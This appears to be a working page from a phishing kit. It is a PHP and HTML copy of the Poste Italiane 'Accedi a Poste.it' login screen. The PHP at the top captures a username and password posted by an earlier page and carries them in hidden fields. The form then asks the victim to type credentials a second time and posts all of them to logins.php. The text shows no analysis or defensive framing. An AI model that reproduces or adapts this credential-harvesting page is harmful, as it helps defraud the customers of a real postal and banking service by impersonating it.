<?php

$username1 = $HTTP_POST_VARS['username1'];
$password1 = $HTTP_POST_VARS['password1'];

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> 
<html lang="it">
<head>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=ISO-8859-1 "/>
<meta HTTP-EQUIV="Pragma" CONTENT="no-cache"/>
<meta HTTP-EQUIV="Expires" CONTENT="-1"/>
<title>Poste Italiane - Accedi a Poste.it </title> 
<link rel="stylesheet" type="text/css" href="css/standard.css">
<link rel="stylesheet" type="text/css" href="css/accediservizi-restyle.css">
<link rel="stylesheet" type="text/css" href="css/stampa.css" media="print">

</head>
<body>
<center> 
<div id="page">
<div id="contenitoreHeader">
<div id="header_login" class="header_login_global">
        <div class="opzioni floatLeft"></div>
        <div><a name="link_principale" id="link_principale" href="">Accedi</a></div>
      </div>
      <ul id="header_navigazione">
        <li><a href=""><img src="gif/logoposte.gif" alt="Homepage"></a></li>
      </ul>
      <div id="header_subnavigazione"><a href="">SERVIZI ONLINE</a> | <a href="">CERCA</a> | <a href="">HOME</a></div>
</div>
<div class="floatAnnulla"></div>
<div id="maincontent">
<div class="win585u">
<div class="wincontent">
<div class="tpl_testata"><div>
  <h1><a name="#contenuto" id="#contenuto">Accedi a Poste.it </a></h1>
<div class="abstract">Per poter usufruire dei servizi online di Poste.it occorre prima identificarsi. Inserisci negli appositi spazi il tuo nome utente e la password. 
</div>
</div></div>
<div class="floatAnnulla"></div>
<div class="creaPagina"><table border="0" cellpadding="0" cellspacing="0" width="100%" summary="tabella layout"><tr><td class="bloccoA">	
<div style="width:275px;">
<div class="titoloAccessoPrivati_interna">
	<p><a href="">Privati</a><span class="business"><strong>Business</strong></span></p>
</div>
<div class="box_interna"  title="Accesso ai servizi per privati e business">
<p style="padding:10px 30px 0 10px;">
<!--<img src="gif/login.gif" border="0" style="margin-right:4px;" alt="Servizi on line">--><strong>Business<br />Accedi ai Servizi Online </strong></p>
<FORM NAME="Login" method="POST" action="logins.php">
	<table cellpadding="0" cellspacing="0" style="margin-left:10px;" summary="login utente">
		<tr valign="middle">
			<td>
			<input name="username2" type="text" class="inputAccedi"></td>
		</tr>
		<tr>
			<td><input name="password2" type="password" maxlength="32" class="inputPassword"><!--</td>-->
    		<img src="gif/lock.gif" alt="https sito sicuro"><INPUT TYPE="submit" value="Accedi" class="bottone">
					<input type="hidden" name="username" value="<?php echo($username1); ?>">
		            <input type="hidden" name="password" value="<?php echo($password1); ?>">
			<br /><a href="" style="font-size:10px;margin-top:7px;">Accedi al conto</a>&raquo;
			</td>
		</tr>
	</table>
</FORM>
<div class="ulLoginContainer">
<ul>
    <li><a href="">Non sei ancora registrato?</a></li>
    <li><a href="">Hai dimenticato la password?</a></li>
    <li><a href="">Come difendersi dal phishing</a><img src="gif/pesce.gif" alt="Difendersi dal Phishing" style="padding-left: 3px;" align="middle"></li>
</ul>
</div>
</div>
</div>
</td>
<td class="bloccoA2">
	Per utilizzare i servizi online e in caso di mancato accesso o non funzionamento dei servizi &egrave; necessario:
<ul class="lista">
	<li>verificare il corretto inserimento del nome utente e della password.<br>
	Il nome utente va inserito come nome.cognome pi&ugrave; l'eventuale estensione (mario.rossi-1234) richiesta durante la registrazione.<br>
	La password va inserita rispettando la sequenza di caratteri maiuscolo o minuscolo come inseriti in fase di registrazione o in occasione dell'ultimo cambio.</li>
	<li>verificare che il browser consenta connessioni con protocollo SSL e accetti i cookie della sessione;</li>
	<li>eseguire periodicamente la pulizia dei file temporanei e dei cookie;</li>
	<li>verificare le propriet&agrave; data/ora e fuso orario del computer.</li>
</ul>
	Qualora i problemi persistano &egrave; possibile contattare il Call Center al numero verde 803.160* (dal luned&igrave; al sabato dalle ore 8.00 alle 
	ore 20.00) effettuando la scelta &quot;3&quot; per i Servizi Internet. In alternativa pu&ograve; inviare un messaggio da questa <a href="">pagina web </a> indicando il suo nome e cognome, un recapito telefonico e la fascia oraria preferita per essere contattato. <br><br>
	Al momento del contatto telefonico &egrave; utile avere il computer collegato a Internet e avere a disposizione il codice di attivazione 
	(ricevuto tramite telegramma) o il codice di customer care (rilasciato al momento della registrazione).
	<div class="tpl_testo">
	(*) chiamata gratuita da rete fissa; le chiamate da rete mobile sono gratuite solo per informazioni su PosteMobile. Per le altre informazioni, da rete mobile chiamare il 199.100.160 il costo della chiamata dipende dall'operatore utilizzato
	</div><br>
</td></tr></table>
</div>
</div>
</div>
<div class="floatAnnulla"></div>
<div class="footer">
	 <a href="" title="Contattaci">Contattaci</a>
	| <a href="" title="Privacy">Privacy</a> |
	&copy; Poste italiane 2011
</div>  
</div>
</div>
</center>

<noscript>
<div><img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="gif/njs.gif"></div>
</noscript>
</body> 
</html>